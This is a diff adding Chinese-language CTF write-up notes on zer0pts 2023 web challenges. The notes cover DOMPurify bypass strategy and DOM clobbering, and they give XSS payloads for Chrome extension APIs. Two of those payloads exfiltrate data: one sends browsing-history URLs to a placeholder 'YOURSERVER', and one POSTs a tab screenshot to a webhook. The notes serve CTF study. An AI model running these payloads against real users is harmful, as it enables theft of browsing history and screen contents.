@@ -2651,3 +2651,28 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
     ```
     若用户构造不存在的id，data就不会被更新，而是继承了之前的值，属于逻辑错误。
 - ruby里的params['permission']包含请求参数，不仅仅是request body and path parameters
+270. [ringtone](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web/ringtone)
+- 当题目用上DomPurify而目标是进行xss时，有以下两种可能：
+    - dompurify不是最新版本，可用旧版的漏洞绕过（基本不考虑要求找0day）
+    - dompurify是最新版本且没有已知漏洞，那么漏洞出在题目的其他代码，考虑其他代码的漏洞，尤其是dom clobbering
+- dom clobbering的复杂情况。`users.privileged.dataset.admin`如何用html代码表示？`<form id=users><img name=privileged data-admin="value"></form>`是一种，也可以用:
+    ```html
+    <div id=users></div>
+    <div id=users name=privileged data-admin="value"></div>
+    ```
+    注意两个`<div>`是必须的，一个div是取不到的。dataset是一个特殊的属性，可以取到任何以`data-`开头的attribute的值，参考 https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes
+- xss js（chrome api）相关
+    - 调用history api获取历史打开的tab的url
+        ```js
+        chrome.history.search({text:``,maxResults:10},function(data){data.forEach(function(page){fetch(`http://YOURSERVER?a=`%2Bpage.url);});});
+        ```
+    - 创建一个new tab
+        ```js
+        t=chrome.tabs.create({url:"url"})
+        ```
+    - 对指定tab id的tab的可见部分截图并带出webhook
+        ```js
+        chrome.tabs.captureVisibleTab(windowId).then(function(data){fetch("url",{method:/POST/.source,body:data})})
+        ```
+271. [Warmuprofile](https://blog.arkark.dev/2023/07/17/zer0pts-ctf/)
+- 处理多线程很麻烦，如果只是一些简单的操作(shell用命令直接实现的)，直接用python的`subprocess.run`就好了
